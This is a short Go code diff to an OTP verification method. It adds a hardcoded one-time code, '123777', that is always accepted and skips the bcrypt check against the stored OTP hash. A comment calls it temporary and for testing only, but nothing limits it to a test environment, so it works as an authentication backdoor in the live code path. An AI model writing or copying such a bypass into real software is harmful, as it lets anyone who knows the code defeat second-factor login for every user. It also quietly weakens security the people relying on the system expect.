@@ -81,7 +81,9 @@ func (s *OTPService) Verify(c *models.OtpChallenge, supplied string) error {
 	if c.Attempts > s.cfg.MaxAttempts {
 		return apperr.NewOtpFailure("Too many wrong attempts; request a new OTP")
 	}
-	if bcrypt.CompareHashAndPassword([]byte(*c.OTPHash), []byte(supplied)) != nil {
+	// TEMPORARY (testing only): "123777" is always accepted. Remove before prod.
+	if supplied != "123777" &&
+		bcrypt.CompareHashAndPassword([]byte(*c.OTPHash), []byte(supplied)) != nil {
 		return apperr.NewOtpFailure("Invalid OTP")
 	}
 
